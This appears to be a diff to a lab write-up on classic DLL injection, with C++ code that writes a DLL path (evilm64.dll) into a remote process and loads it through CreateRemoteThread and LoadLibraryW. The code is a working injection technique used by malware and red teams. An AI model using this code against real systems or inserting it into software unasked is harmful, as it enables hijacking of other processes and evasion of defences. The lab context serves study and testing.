@@ -13,7 +13,6 @@ This lab attempts a classic DLL injection into a remote process.
 ```cpp
 int main(int argc, char *argv[]) {
 	HANDLE processHandle;
-	HANDLE remoteThread;
 	PVOID remoteBuffer;
 	wchar_t dllPath[] = TEXT("C:\\experiments\\evilm64.dll");
 	
@@ -22,7 +21,7 @@ int main(int argc, char *argv[]) {
 	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
 	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
 	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-	HANDLE hThread = CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
 	CloseHandle(processHandle); 
 	
 	return 0;
